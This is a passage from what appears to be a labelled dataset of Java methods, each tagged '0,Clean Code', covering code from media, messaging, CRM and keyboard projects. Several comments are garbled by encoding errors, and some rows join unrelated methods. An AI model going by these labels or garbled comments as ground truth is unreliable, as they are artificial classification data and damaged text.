      storage.stopPlay(inviteInfo.getDeviceId(),inviteInfo.getChannelId());
    }
  }
}
",0,Clean Code
"/** 
 * Verify that the JWT payload has the required properties and the values as valid
 */
@Test public void testThatDecodedJWTPayloadHasRequiredClaims() throws Exception {
  String[] args={""../""};
  TestingProcessManager.TestingProcess process=TestingProcessManager.start(args);
  assertNotNull(process.checkOrWaitForEvent(ProcessState.PROCESS_STATE.STARTED));
  String algorithm=""RS256"";
  JsonObject payload=new JsonObject();
  payload.addProperty(""customClaim"",""customValue"");
  String jwksDomain=""http://localhost"";
  long validity=3600;
  long expectedIssuedAtTime=System.currentTimeMillis() / 1000;
  long expectedExpiry=expectedIssuedAtTime + validity;
  String jwt=JWTSigningFunctions.createJWTToken(process.getProcess(),algorithm,payload,jwksDomain,validity,false);
  DecodedJWT decodedJWT=JWT.decode(jwt);
  Claim issuer=decodedJWT.getClaim(""iss"");
  Claim issuedAtTime=decodedJWT.getClaim(""iat"");
  Claim expiry=decodedJWT.getClaim(""exp"");
  if (issuer.isNull() || issuedAtTime.isNull() || expiry.isNull()) {
    throw new Exception(""JWT payload is missing one or more required claim (iss, iat, exp)"");
  }
  if (!issuer.asString().equals(jwksDomain)) {
    throw new Exception(""JWT payload has invalid iss claim"");
  }
  if (Math.abs(issuedAtTime.asLong() - expectedIssuedAtTime) > 1) {
    throw new Exception(""JWT iat claim does not match expected value"");
  }
  if (Math.abs(expiry.asLong() - expectedExpiry) > 1) {
    throw new Exception(""JWT exp claim does not match expected value"");
  }
  process.kill();
  assertNotNull(process.checkOrWaitForEvent(ProcessState.PROCESS_STATE.STOPPED));
}",0,Clean Code
"public static String toStringBinary(final byte[] b){
  if (b == null) {
    return ""null"";
  }
  return toStringBinary(b,0,b.length);
}
public static String toStringBinary(final byte[] b,int off,int len){
  StringBuilder result=new StringBuilder();
  String first=new String(b,off,len,StandardCharsets.ISO_8859_1);
  for (int i=0; i < first.length(); ++i) {
    int ch=first.charAt(i) & 0xFF;
    if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z')|| "" `~!@#$%^&*()-_=+[]{}\\|;:'\"",.<>/?"".indexOf(ch) >= 0) {
      result.append(first.charAt(i));
    }
 else {
      result.append(String.format(""\\x%02X"",ch));
    }
  }
  return result.toString();
}",0,Clean Code
"public void afterProcess(AuditLog auditLog){
  try {
    String auditLogString=mapper.writeValueAsString(auditLog);
    Logger auditLogger=provider.getLogger();
    if (auditLogger == null) {
      log.warn(""Audit Log logger was not set, please set logger for view audit logs"");
    }
 else {
      auditLogger.info(auditLogString);
    }
  }
 catch (  JsonProcessingException e) {
    log.error(e.getMessage(),e);
  }
}
",0,Clean Code
"@Override public void connectionsAdded(int start,ConnectionDescriptor[] conns){
synchronized (this) {
    for (    ConnectionDescriptor conn : conns) {
      mPortToConnId.put(conn.local_port,conn.incr_id);
      int pending_idx=mPendingMessages.indexOfKey(conn.local_port);
      if (pending_idx >= 0) {
        ArrayList<PendingMessage> pp=mPendingMessages.valueAt(pending_idx);
        mPendingMessages.removeAt(pending_idx);
        for (        PendingMessage pending : pp) {
          handleMessage(conn,pending.type,pending.msg,pending.when);
        }
      }
    }
  }
}",0,Clean Code
"private static int[][] applyKernel(int[][] values){
  int[][] result=new int[values.length][values[0].length];
  for (int i=0; i < values.length; i++) {
    for (int j=0; j < values[i].length; j++) {
      int value=values[i][j];
      float newValue=0;
      for (int iOffset=-2; iOffset <= 2; iOffset++) {
        for (int jOffset=-2; jOffset <= 2; jOffset++) {
          int iTarget=i + iOffset;
          int jTarget=j + jOffset;
          int ref=0;
          if (iTarget < 0 || iTarget >= values.length || jTarget < 0 || jTarget >= values[0].length)           ref=value;
 else           ref=values[iTarget][jTarget];
          if (ref == Integer.MIN_VALUE)           ref=value;
          newValue+=kernel[iOffset + 2][jOffset + 2] * ref;
        }
      }
      result[i][j]=Mth.floor(newValue + .5f);
    }
  }
  return result;
}",0,Clean Code
"/** 
 * Called to write sample data to the output.
 * @param input An {@link ExtractorInput} from which to read the sample data.
 * @param length The maximum length to read from the input.
 * @param allowEndOfInput True if encountering the end of the input having read no data isallowed, and should result in  {@link C#RESULT_END_OF_INPUT} being returned. False if itshould be considered an error, causing an  {@link EOFException} to be thrown.
 * @return The number of bytes appended.
 * @throws IOException If an error occurred reading from the input.
 * @throws InterruptedException If the thread was interrupted.
 */
int sampleData(ExtractorInput input,int length,boolean allowEndOfInput) throws IOException, InterruptedException ;
/** 
 * Called to write sample data to the output.
 * @param data A {@link ParsableByteArray} from which to read the sample data.
 * @param length The number of bytes to read, starting from {@code data.getPosition()}.
 */
void sampleData(ParsableByteArray data,int length);
",0,Clean Code
"/** 
 * custom addon 璧勬簮鐢宠
 * @param request
 * @return
 */
@Override public ApplyCustomAddonInstanceRes applyCustomAddonInstance(ApplyCustomAddonInstanceReq request){
  String namespaceId=request.getNamespaceId();
  String addonId=request.getAddonId();
  String addonVersion=request.getAddonVersion();
  String addonName=request.getAddonName();
  Map<String,String> addonAttrs=request.getAddonAttrs();
  CustomAddonInstanceQueryCondition condition=CustomAddonInstanceQueryCondition.builder().namespaceId(namespaceId).addonId(addonId).addonVersion(addonVersion).addonName(addonName).addonAttrs(addonAttrs).build();
  CustomAddonInstanceDO addonInstance=customAddonInstanceRepository.getByCondition(condition);
  if (addonInstance != null) {
    return ApplyCustomAddonInstanceRes.builder().ready(true).customAddonInstanceId(addonInstance.getAddonInstanceId()).build();
  }
  CustomAddonInstanceTaskDO task=customAddonInstanceTaskService.apply(request);
  ObjectUtil.checkNull(CheckNullObject.builder().actionName(""applyCustomAddonInstance"").checkObject(task).objectName(""task"").build());
  return ApplyCustomAddonInstanceRes.builder().ready(false).customAddonInstanceTaskId(task.getId()).build();
}
",0,Clean Code
"@Override public Map<String,Object> genTaskCodeList(Integer genNum){
  Map<String,Object> result=new HashMap<>();
  if (genNum == null || genNum < 1 || genNum > 100) {
    log.warn(""Parameter genNum must be great than 1 and less than 100."");
    putMsg(result,Status.DATA_IS_NOT_VALID,genNum);
    return result;
  }
  List<Long> taskCodes=new ArrayList<>();
  try {
    for (int i=0; i < genNum; i++) {
      taskCodes.add(CodeGenerateUtils.genCode());
    }
  }
 catch (  CodeGenerateException e) {
    log.error(""Generate task definition code error."",e);
    putMsg(result,Status.INTERNAL_SERVER_ERROR_ARGS,""Error generating task definition code"");
  }
  putMsg(result,Status.SUCCESS);
  result.put(Constants.DATA_LIST,taskCodes);
  return result;
}",0,Clean Code
"/** 
 * Notifies listeners for actions adapter changed on UI thread.
 */
final void notifyActionsAdapterChanged(){
  if (mListeners != null) {
    for (int i=0; i < mListeners.size(); ) {
      Listener l=mListeners.get(i).get();
      if (l == null) {
        mListeners.remove(i);
      }
 else {
        l.onActionsAdapterChanged(this);
        i++;
      }
    }
  }
}",0,Clean Code
"/** 
 * Sets the state of the bottom sheet. The bottom sheet will transition to that state with animation.
 * @param state One of {@link #STATE_COLLAPSED},  {@link #STATE_EXPANDED},  {@link #STATE_HIDDEN}, or  {@link #STATE_HALF_EXPANDED}.
 */
public void setState(@StableState int state){
  if (state == STATE_DRAGGING || state == STATE_SETTLING) {
    throw new IllegalArgumentException(""STATE_"" + (state == STATE_DRAGGING ? ""DRAGGING"" : ""SETTLING"") + "" should not be set externally."");
  }
  if (!hideable && state == STATE_HIDDEN) {
    Log.w(TAG,""Cannot set state: "" + state);
    return;
  }
  final int finalState;
  if (state == STATE_HALF_EXPANDED && fitToContents && getTopOffsetForState(state) <= fitToContentsOffset) {
    finalState=STATE_EXPANDED;
  }
 else {
    finalState=state;
  }
  if (viewRef == null || viewRef.get() == null) {
    setStateInternal(state);
  }
 else {
    final V child=viewRef.get();
    runAfterLayout(child,new Runnable(){
      @Override public void run(){
        startSettling(child,finalState,false);
      }
    }
);
  }
}
",0,Clean Code
"@Override public boolean handler(TaskInfo taskInfo){
  try {
    FeiShuRobotAccount account=accountUtils.getAccountById(taskInfo.getSendAccount(),FeiShuRobotAccount.class);
    FeiShuRobotParam feiShuRobotParam=assembleParam(taskInfo);
    String result=HttpRequest.post(account.getWebhook()).header(Header.CONTENT_TYPE.getValue(),ContentType.JSON.getValue()).body(JSON.toJSONString(feiShuRobotParam)).timeout(2000).execute().body();
    FeiShuRobotResult feiShuRobotResult=JSON.parseObject(result,FeiShuRobotResult.class);
    if (feiShuRobotResult.getStatusCode() == 0) {
      return true;
    }
    log.error(""FeiShuRobotHandler#handler fail! result:{},params:{}"",JSON.toJSONString(feiShuRobotResult),JSON.toJSONString(taskInfo));
  }
 catch (  Exception e) {
    log.error(""FeiShuRobotHandler#handler fail!e:{},params:{}"",Throwables.getStackTraceAsString(e),JSON.toJSONString(taskInfo));
  }
  return false;
}",0,Clean Code
"public static void dumpUnparsedMessage(TLObject message,long messageId){
  if (!BuildVars.DEBUG_PRIVATE_VERSION || !BuildVars.LOGS_ENABLED || message == null) {
    return;
  }
  try {
    checkGson();
    getInstance().dateFormat.format(System.currentTimeMillis());
    String messageStr=""receive message -> "" + message.getClass().getSimpleName() + "" : ""+ gson.toJson(message);
    String res=""null"";
    long time=System.currentTimeMillis();
    FileLog.getInstance().logQueue.postRunnable(() -> {
      try {
        String metadata=getInstance().dateFormat.format(time);
        FileLog.getInstance().tlStreamWriter.write(metadata);
        FileLog.getInstance().tlStreamWriter.write(""\n"");
        FileLog.getInstance().tlStreamWriter.write(messageStr);
        FileLog.getInstance().tlStreamWriter.write(""\n\n"");
        FileLog.getInstance().tlStreamWriter.flush();
        Log.d(mtproto_tag,""msgId="" + messageId);
        Log.d(mtproto_tag,messageStr);
        Log.d(mtproto_tag,"" "");
      }
 catch (      Exception e) {
        e.printStackTrace();
      }
    }
);
  }
 catch (  Throwable e) {
  }
}
",0,Clean Code
"/** 
 * Parses the configuration map to create an optional MeterRegistry.
 * @param config The configuration map for the MeterRegistry.
 * @return Optional MeterRegistry created based on the configuration. Empty optional if the typeis invalid or empty.
 */
public static Optional<MeterRegistry> parseMeterRegistryConfig(Map<String,Object> config){
  if (config == null) {
    return Optional.empty();
  }
  Object type=config.get(""type"");
  if (!(type instanceof String) || type == null || StringUtils.isEmpty((String)type)) {
    return Optional.empty();
  }
  return getConfigBuilder((String)type).map(x -> x.registry(config));
}
",0,Clean Code
"@Override public BasePage<Map<String,Object>> eventDealBusinessPageList(QueryEventCrmPageBO eventCrmPageBO){
  Long userId=eventCrmPageBO.getUserId();
  Long time=eventCrmPageBO.getTime();
  if (userId == null) {
    userId=UserUtil.getUserId();
  }
  List<Integer> businessIds=getBaseMapper().eventDealBusinessPageList(userId,new Date(time));
  if (businessIds.size() == 0) {
    return new BasePage<>();
  }
  List<String> collect=businessIds.stream().map(Object::toString).collect(Collectors.toList());
  CrmSearchBO crmSearchBO=new CrmSearchBO();
  crmSearchBO.setSearchList(Collections.singletonList(new CrmSearchBO.Search(""_id"",""text"",CrmSearchBO.FieldSearchEnum.ID,collect)));
  crmSearchBO.setLabel(CrmEnum.CUSTOMER.getType());
  crmSearchBO.setPage(eventCrmPageBO.getPage());
  crmSearchBO.setLimit(eventCrmPageBO.getLimit());
  BasePage<Map<String,Object>> page=queryPageList(crmSearchBO);
  return page;
}",0,Clean Code
"/** 
 * If no bounds were set initially, then infer bounds now from  {@code latLonProvider}. 
 */
public Bounds addFallbackProvider(Provider latLonProvider){
  if (latLon == null) {
    Envelope bounds=latLonProvider.getLatLonBounds();
    if (bounds != null && !bounds.isNull() && bounds.getArea() > 0) {
      LOGGER.info(""Setting map bounds from input: {}"",bounds);
      set(bounds);
    }
  }
  return this;
}",0,Clean Code
"public int getUnreadState(long dialogId){
  return getUnreadState(dialogId,0);
}
public int getUnreadState(long dialogId,int storyId){
  if (dialogId == 0) {
    return STATE_READ;
  }
  TL_stories.PeerStories peerStories=allStoriesMap.get(dialogId);
  if (peerStories == null) {
    peerStories=getStoriesFromFullPeer(dialogId);
  }
  if (peerStories == null) {
    return STATE_READ;
  }
  if (dialogId == UserConfig.getInstance(currentAccount).getClientUserId()) {
    if (!Utilities.isNullOrEmpty(uploadingStoriesByDialogId.get(dialogId))) {
      return STATE_UNREAD;
    }
  }
  boolean hasUnread=false;
  int maxReadId=Math.max(peerStories.max_read_id,dialogIdToMaxReadId.get(dialogId,0));
  for (int i=0; i < peerStories.stories.size(); i++) {
    if ((storyId == 0 || peerStories.stories.get(i).id == storyId) && peerStories.stories.get(i).id > maxReadId) {
      hasUnread=true;
      if (peerStories.stories.get(i).close_friends) {
        return STATE_UNREAD_CLOSE_FRIEND;
      }
    }
  }
  if (isLastUploadingFailed(dialogId)) {
    return STATE_READ;
  }
  if (hasUnread) {
    return STATE_UNREAD;
  }
  return STATE_READ;
}",0,Clean Code
"@SuppressWarnings(""deprecation"") @UiThread public void hide(){
  Transition sharedAxis=new MaterialSharedAxis(MaterialSharedAxis.Y,false);
  TransitionManager.beginDelayedTransition(this,sharedAxis);
  setVisibility(GONE);
  mSelectionBottomPadding=0;
  mInSelectionMode=false;
  if (mAdapter != null) {
    if (mAdapter.mRecyclerView != null && ViewCompat.getFitsSystemWindows(mAdapter.mRecyclerView) && mLastInsets != null) {
      mSelectionBottomPadding+=mLastInsets.getSystemWindowInsetBottom();
    }
    mAdapter.setInSelectionMode(false);
    mAdapter.setSelectionBottomPadding(mSelectionBottomPadding);
  }
}",0,Clean Code
"/** 
 * find the simplest constructor for specified class
 * @param clazz any class
 * @return best constructor
 */
public static Constructor<?> getBestConstructor(Class<?> clazz,boolean useGeneratedConstructor){
  Constructor<?> bestConstructor=null;
  int minimalExceptionCount=999;
  int minimalParameterCount=999;
  for (  Constructor<?> constructor : clazz.getDeclaredConstructors()) {
    Class<?>[] parameterTypes=constructor.getParameterTypes();
    Class<?>[] exceptionTypes=constructor.getExceptionTypes();
    if (parameterTypes.length == 1 && parameterTypes[0].equals(Void.class)) {
      if (useGeneratedConstructor) {
        return constructor;
      }
    }
 else     if (exceptionTypes.length < minimalExceptionCount || (exceptionTypes.length == minimalExceptionCount && parameterTypes.length < minimalParameterCount)) {
      minimalExceptionCount=exceptionTypes.length;
      minimalParameterCount=parameterTypes.length;
      bestConstructor=constructor;
    }
  }
  return bestConstructor;
}
/** 
 * find the simplest constructor including the testable generated one
 * @param clazz any class
 * @return best constructor
 */
public static Constructor<?> getBestConstructor(Class<?> clazz){
  return getBestConstructor(clazz,true);
}",0,Clean Code
"@Override public Task getTask(){
  for (  Task task : project.getTasks()) {
    if ((task instanceof ProguardTask || task instanceof R8Task) && ((ProguardConfigurableTask)task).getVariantName().equals(variantName)) {
      return task;
    }
  }
  return null;
}",0,Clean Code
"/** 
 * Apply a processed input event. <p> All input events should be supported, including software/hardware events, characters as well as deletions, multiple inputs and gestures.
 * @param event the event to apply. Must not be null.
 */
public void applyProcessedEvent(final Event event){
  applyProcessedEvent(event,false);
}
public void applyProcessedEvent(final Event event,final boolean keepCursorPosition){
  mCombinerChain.applyProcessedEvent(event);
  final int primaryCode=event.getMCodePoint();
  final int keyX=event.getMX();
  final int keyY=event.getMY();
  final int newIndex=size();
  refreshTypedWordCache();
  if (!keepCursorPosition || newIndex == mCodePointSize)   mCursorPositionWithinWord=mCodePointSize;
  if (0 == mCodePointSize) {
    mIsOnlyFirstCharCapitalized=false;
  }
  if (KeyCode.DELETE != event.getMKeyCode()) {
    if (newIndex < MAX_WORD_LENGTH) {
      if (!mIsBatchMode) {
        mInputPointers.addPointerAt(newIndex,keyX,keyY,0,0);
      }
    }
    if (0 == newIndex) {
      mIsOnlyFirstCharCapitalized=Character.isUpperCase(primaryCode);
    }
 else {
      mIsOnlyFirstCharCapitalized=mIsOnlyFirstCharCapitalized && !Character.isUpperCase(primaryCode);
    }
    if (Character.isUpperCase(primaryCode))     mCapsCount++;
    if (Character.isDigit(primaryCode))     mDigitsCount++;
  }
  mAutoCorrection=null;
}",0,Clean Code
"/** 
 * 获取当前网络ip
 * @param request
 * @return
 */
public static String getIpAddr(HttpServletRequest request){
  String ipAddress=request.getHeader(""x-forwarded-for"");
  if (ipAddress == null || ipAddress.length() == 0 || ""unknown"".equalsIgnoreCase(ipAddress)) {
    ipAddress=request.getHeader(""Proxy-Client-IP"");
  }
  if (ipAddress == null || ipAddress.length() == 0 || ""unknown"".equalsIgnoreCase(ipAddress)) {
    ipAddress=request.getHeader(""WL-Proxy-Client-IP"");
  }
  if (ipAddress == null || ipAddress.length() == 0 || ""unknown"".equalsIgnoreCase(ipAddress)) {
    ipAddress=request.getRemoteAddr();
    if (ipAddress.equals(""127.0.0.1"") || ipAddress.equals(""0:0:0:0:0:0:0:1"")) {
      InetAddress inet=null;
      try {
        inet=InetAddress.getLocalHost();
      }
 catch (      UnknownHostException e) {
        e.printStackTrace();
      }
      ipAddress=inet.getHostAddress();
    }
  }
  if (ipAddress != null && ipAddress.length() > 15) {
    if (ipAddress.indexOf("","") > 0) {
      ipAddress=ipAddress.substring(0,ipAddress.indexOf("",""));
    }
  }
  return ipAddress;
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void deleteWorkTaskLabel(WorkTaskLabelBO workTaskLabelBO){
  WorkTask task=getById(workTaskLabelBO.getTaskId());
  Integer labelId=workTaskLabelBO.getLabelId();
  WorkTaskLabel taskLabel=workTaskLabelService.getById(labelId);
  Set<Integer> labelIds=SeparatorUtil.toSet(task.getLabelId());
  if (!labelIds.contains(labelId)) {
    throw new CrmException(WorkCodeEnum.WORK_TASK_LABEL_EXIST_ERROR);
  }
  labelIds.remove(labelId);
  task.setLabelId(SeparatorUtil.fromSet(labelIds));
  WorkTaskLog workTaskLog=new WorkTaskLog();
  workTaskLog.setUserId(UserUtil.getUserId());
  workTaskLog.setTaskId(task.getTaskId());
  workTaskLog.setContent(""鍒犻櫎浜嗘爣绛� "" + taskLabel.getName());
  workTaskLogService.saveWorkTaskLog(workTaskLog);
  updateById(task);
}
",0,Clean Code
"default MapDataPacket preparePacket(int mapId){
  return preparePacket(mapId,0,0,WIDTH,HEIGHT);
}
default MapDataPacket preparePacket(int mapId,int minX,int minY,int width,int height){
  byte[] colors;
  if (minX == 0 && minY == 0 && width == WIDTH && height == HEIGHT) {
    colors=toMapColors();
  }
 else {
    colors=new byte[width * height];
    final byte[] mapColors=toMapColors();
    for (int y=minY; y < Math.min(HEIGHT,minY + height); y++) {
      for (int x=minX; x < Math.min(WIDTH,minX + width); x++) {
        byte color=mapColors[index(x,y,WIDTH)];
        colors[index(x - minX,y - minY,width)]=color;
      }
    }
  }
  return new MapDataPacket(mapId,(byte)0,false,false,List.of(),new MapDataPacket.ColorContent((byte)width,(byte)height,(byte)minX,(byte)minY,colors));
}",0,Clean Code
"private Object createResponse(BeforeEvent event,Map<String,Object> responseMap,Object mockResponseProtocolVersion) throws Exception {
  ClassLoader javaClassLoader=event.javaClassLoader;
  Class<?> aClass=javaClassLoader.loadClass(""org.apache.http.message.BasicHttpResponse"");
  Constructor<?>[] constructors=aClass.getConstructors();
  Constructor currentCsc=null;
  for (  Constructor constructor : constructors) {
    Class<?>[] classes=constructor.getParameterTypes();
    if (classes.length == 3) {
      if (classes[0].getCanonicalName().equalsIgnoreCase(""org.apache.http.ProtocolVersion"") && classes[1].getCanonicalName().equalsIgnoreCase(""int"") && classes[2].getCanonicalName().equalsIgnoreCase(""java.lang.String"")) {
        currentCsc=constructor;
        break;
      }
    }
  }
  if (currentCsc == null) {
    throw new RuntimeException(""apache-http鐗堟湰涓嶅吋瀹癸紝璇疯仈绯诲钩鍙颁汉鍛樻敮鎸佸吋瀹圭殑apache-client鐗堟湰"");
  }
  return currentCsc.newInstance(mockResponseProtocolVersion,responseMap.get(""responseCode""),responseMap.get(""responseMessage""));
}",0,Clean Code
"/** 
 * Assigns points to the nearest cluster.  Only `assignments` are updated, there is no precomputation done for the centroid updates.
 * @return the number of points that changed clusters
 */
private int updateAssignedPointsAnisotropic(){
  float pcm=computeParallelCostMultiplier(anisotropicThreshold,points[0].length());
  float[] cNormSquared=new float[k];
  for (int i=0; i < k; i++) {
    cNormSquared[i]=dotProduct(centroids,i * points[0].length(),centroids,i * points[0].length(),points[0].length());
  }
  int changedCount=0;
  for (int i=0; i < points.length; i++) {
    var x=points[i];
    var xNormSquared=dotProduct(x,x);
    int index=assignments[i];
    float minDist=Float.MAX_VALUE;
    for (int j=0; j < k; j++) {
      float dist=weightedDistance(x,j,pcm,cNormSquared[j],xNormSquared);
      if (dist < minDist) {
        minDist=dist;
        index=j;
      }
    }
    if (index != assignments[i]) {
      changedCount++;
      assignments[i]=index;
    }
  }
  return changedCount;
}",0,Clean Code
"@Test public void testCreatePayNotifyTask_order(){
  PayNotifyServiceImpl payNotifyService=mock(PayNotifyServiceImpl.class);
  try (MockedStatic<SpringUtil> springUtilMockedStatic=mockStatic(SpringUtil.class)){
    springUtilMockedStatic.when(() -> SpringUtil.getBean(eq(PayNotifyServiceImpl.class))).thenReturn(payNotifyService);
    Integer type=PayNotifyTypeEnum.ORDER.getType();
    Long dataId=1L;
    PayOrderDO order=randomPojo(PayOrderDO.class);
    when(orderService.getOrder(eq(1L))).thenReturn(order);
    mockLock(null);
    notifyService.createPayNotifyTask(type,dataId);
    PayNotifyTaskDO dbTask=notifyTaskMapper.selectOne(null);
    assertNotNull(dbTask.getNextNotifyTime());
    assertThat(dbTask).extracting(""type"",""dataId"",""status"",""notifyTimes"",""maxNotifyTimes"",""appId"",""merchantOrderId"",""notifyUrl"").containsExactly(type,dataId,PayNotifyStatusEnum.WAITING.getStatus(),0,9,order.getAppId(),order.getMerchantOrderId(),order.getNotifyUrl());
    verify(payNotifyService).executeNotify0(eq(dbTask));
  }
 }",0,Clean Code
"public static int searchContacts(int reqId,String query,Utilities.Callback<List<TLRPC.User>> onDone){
  MessagesController controller=MessagesController.getInstance(UserConfig.selectedAccount);
  ConnectionsManager connection=ConnectionsManager.getInstance(UserConfig.selectedAccount);
  if (reqId != 0) {
    connection.cancelRequest(reqId,false);
  }
  if (query == null || query.isEmpty()) {
    AndroidUtilities.runOnUIThread(() -> onDone.run(Collections.emptyList()));
    return 0;
  }
  TLRPC.TL_contacts_search req=new TLRPC.TL_contacts_search();
  req.q=query;
  req.limit=50;
  return connection.sendRequest(req,(response,error) -> {
    if (response instanceof TLRPC.TL_contacts_found) {
      TLRPC.TL_contacts_found res=(TLRPC.TL_contacts_found)response;
      controller.putUsers(res.users,false);
      List<TLRPC.User> result=new ArrayList<>();
      for (int a=0; a < res.users.size(); a++) {
        TLRPC.User user=res.users.get(a);
        if (!user.self && !UserObject.isDeleted(user) && !user.bot&& !UserObject.isService(user.id)) {
          result.add(user);
        }
      }
      AndroidUtilities.runOnUIThread(() -> onDone.run(result));
    }
  }
);
}",0,Clean Code
"@NonNull @Override public String toString(){
  if (!mIsValid) {
    return ""INVALID"";
  }
  if (mMode == MODE_ALPHABET) {
    return mIsAlphabetShiftLocked ? ""ALPHABET_SHIFT_LOCKED"" : ""ALPHABET_"" + shiftModeToString(mShiftMode);
  }
  if (mMode == MODE_EMOJI) {
    return ""EMOJI"";
  }
  if (mMode == MODE_CLIPBOARD) {
    return ""CLIPBOARD"";
  }
  if (mMode == MODE_NUMPAD) {
    return ""NUMPAD"";
  }
  return ""SYMBOLS_"" + shiftModeToString(mShiftMode);
}
@Override public String toString(){
  return ""[keyboard="" + (mMode == MODE_ALPHABET ? mAlphabetShiftState.toString() : (mIsSymbolShifted ? ""SYMBOLS_SHIFTED"" : ""SYMBOLS"")) + "" shift=""+ mShiftKeyState+ "" symbol=""+ mSymbolKeyState+ "" switch=""+ switchStateToString(mSwitchState)+ ""]"";
}
",0,Clean Code
"public static String parseAddress(String full){
  if (full == null || full.isBlank() || !full.contains("":""))   return full;
  return full.substring(0,full.lastIndexOf(':'));
}",0,Clean Code
"@Override protected void onAttachedToWindow(){
  super.onAttachedToWindow();
  attachedToWindow=true;
  if (playing) {
    drawable.start();
  }
  drawable.setMasterParent(this);
}
@Override protected void onAttachedToWindow(){
  super.onAttachedToWindow();
  if (parentFragment != null && parentFragment.getParentLayout() != null && parentFragment.getParentLayout().isSheet()) {
    setWindowView(parentFragment.getParentLayout().getWindow().getDecorView());
  }
 else {
    setWindowView(parentActivity.getWindow().getDecorView());
  }
}
",0,Clean Code
"/** 
 * 瀛楃涓茶浆list
 * @param str 瀛楃涓�
 * @param sep 鍒嗛殧绗�
 * @param filterBlank 杩囨护绾┖鐧�
 * @param trim 鍘绘帀棣栧熬绌虹櫧
 * @return list闆嗗悎
 */
public static List<String> str2List(String str,String sep,boolean filterBlank,boolean trim){
  List<String> list=new ArrayList<String>();
  if (StringUtil.isEmpty(str)) {
    return list;
  }
  if (filterBlank && StringUtil.isBlank(str)) {
    return list;
  }
  String[] split=str.split(sep);
  for (  String string : split) {
    if (filterBlank && StringUtil.isBlank(string)) {
      continue;
    }
    if (trim) {
      string=string.trim();
    }
    list.add(string);
  }
  return list;
}",0,Clean Code
"/** 
 * Creates a shape where all dimensions have a known, fixed value.
 * @param dimensions The dimensions.
 */
public ONNXShape(long[] dimensions){
  for (int i=0; i < dimensions.length; i++) {
    if (dimensions[i] == UNKNOWN_DIMENSION) {
      throw new IllegalArgumentException(""Must specify a name for any unbound dimensions, at idx "" + i + "" found ""+ dimensions[i]);
    }
  }
  this.dimensions=dimensions;
  this.dimensionOverrides=null;
}
/** 
 * Creates a shape where some dimensions may be unknown. <p> Unknown dimensions must be named, the two arrays must be of the same length, wherever the long value is -1, the String value must be non-null, and wherever the String value is null the long value must be positive.
 * @param dimensions The known dimensions.
 * @param dimensionOverrides Names for any unknown dimensions.
 */
public ONNXShape(long[] dimensions,String[] dimensionOverrides){
  if (dimensions.length != dimensionOverrides.length) {
    throw new IllegalArgumentException(""Must supply dimensions of equal length, found "" + dimensions.length + "", and ""+ dimensionOverrides.length);
  }
  for (int i=0; i < dimensions.length; i++) {
    if (((dimensions[i] == UNKNOWN_DIMENSION) && (dimensionOverrides[i] == null)) || ((dimensions[i] != UNKNOWN_DIMENSION) && (dimensionOverrides[i] != null))) {
      throw new IllegalArgumentException(""Only one of dimensions and dimensionOverrides must contain a value, at idx "" + i + "" found ""+ dimensions[i]+ "" and ""+ dimensionOverrides[i]);
    }
  }
  this.dimensions=dimensions;
  this.dimensionOverrides=dimensionOverrides;
}",0,Clean Code
"/** 
 * @param cache Cache instance to be used to store downloaded data.
 * @param upstreamFactory A {@link DataSource.Factory} for creating {@link DataSource}s for downloading data.
 */
public DownloaderConstructorHelper(Cache cache,DataSource.Factory upstreamFactory){
  this(cache,upstreamFactory,null,null,null);
}
/** 
 * @param cache Cache instance to be used to store downloaded data.
 * @param upstreamFactory A {@link DataSource.Factory} for creating {@link DataSource}s for downloading data.
 * @param cacheReadDataSourceFactory A {@link DataSource.Factory} for creating {@link DataSource}s for reading data from the cache. If null then a  {@link FileDataSourceFactory} will be used.
 * @param cacheWriteDataSinkFactory A {@link DataSink.Factory} for creating {@link DataSource}s for writing data to the cache. If null then a  {@link CacheDataSinkFactory} will be used.
 * @param priorityTaskManager A {@link PriorityTaskManager} to use when downloading. If non-null,downloaders will register as tasks with priority  {@link C#PRIORITY_DOWNLOAD} whilstdownloading.
 */
public DownloaderConstructorHelper(Cache cache,DataSource.Factory upstreamFactory,@Nullable DataSource.Factory cacheReadDataSourceFactory,@Nullable DataSink.Factory cacheWriteDataSinkFactory,@Nullable PriorityTaskManager priorityTaskManager){
  this(cache,upstreamFactory,cacheReadDataSourceFactory,cacheWriteDataSinkFactory,priorityTaskManager,null);
}
/** 
 * @param cache Cache instance to be used to store downloaded data.
 * @param upstreamFactory A {@link DataSource.Factory} for creating {@link DataSource}s for downloading data.
 * @param cacheReadDataSourceFactory A {@link DataSource.Factory} for creating {@link DataSource}s for reading data from the cache. If null then a  {@link FileDataSourceFactory} will be used.
 * @param cacheWriteDataSinkFactory A {@link DataSink.Factory} for creating {@link DataSource}s for writing data to the cache. If null then a  {@link CacheDataSinkFactory} will be used.
 * @param priorityTaskManager A {@link PriorityTaskManager} to use when downloading. If non-null,downloaders will register as tasks with priority  {@link C#PRIORITY_DOWNLOAD} whilstdownloading.
 * @param cacheKeyFactory An optional factory for cache keys.
 */
public DownloaderConstructorHelper(Cache cache,DataSource.Factory upstreamFactory,@Nullable DataSource.Factory cacheReadDataSourceFactory,@Nullable DataSink.Factory cacheWriteDataSinkFactory,@Nullable PriorityTaskManager priorityTaskManager,@Nullable CacheKeyFactory cacheKeyFactory){
  if (priorityTaskManager != null) {
    upstreamFactory=new PriorityDataSourceFactory(upstreamFactory,priorityTaskManager,C.PRIORITY_DOWNLOAD);
  }
  DataSource.Factory readDataSourceFactory=cacheReadDataSourceFactory != null ? cacheReadDataSourceFactory : new FileDataSourceFactory();
  if (cacheWriteDataSinkFactory == null) {
    cacheWriteDataSinkFactory=new CacheDataSinkFactory(cache,CacheDataSink.DEFAULT_FRAGMENT_SIZE);
  }
  onlineCacheDataSourceFactory=new CacheDataSourceFactory(cache,upstreamFactory,readDataSourceFactory,cacheWriteDataSinkFactory,CacheDataSource.FLAG_BLOCK_ON_CACHE,null,cacheKeyFactory);
  offlineCacheDataSourceFactory=new CacheDataSourceFactory(cache,DummyDataSource.FACTORY,readDataSourceFactory,null,CacheDataSource.FLAG_BLOCK_ON_CACHE,null,cacheKeyFactory);
  this.cache=cache;
  this.priorityTaskManager=priorityTaskManager;
  this.cacheKeyFactory=cacheKeyFactory;
}
",0,Clean Code
"public ArrayList<TLRPC.Document> getRecentStickers(int type){
  return getRecentStickers(type,false);
}
public ArrayList<TLRPC.Document> getRecentStickers(int type,boolean firstEmpty){
  return getRecentStickers(type,false,0);
}
public ArrayList<TLRPC.Document> getRecentStickers(int type,boolean firstEmpty,int padding){
